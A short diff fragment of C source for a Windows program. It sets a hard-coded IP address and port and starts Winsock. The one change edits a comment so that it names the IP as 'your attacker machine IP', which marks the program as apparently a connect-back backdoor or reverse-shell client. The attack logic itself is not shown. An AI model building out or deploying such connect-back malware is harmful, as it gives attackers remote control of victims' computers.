@@ -56,7 +56,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int 
 	char *ServIP; // Point to the memory iders of var.
 	WSADATA wsaData;
 	
-	ServIP = "192.168.1.30" ; // Change the IP address given
+	ServIP = "192.168.1.30" ; // Change the IP address given as your attacker machine IP
 	ServPort = 50005 ; // Select an empty port of the machine.
 	
 	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0 ){
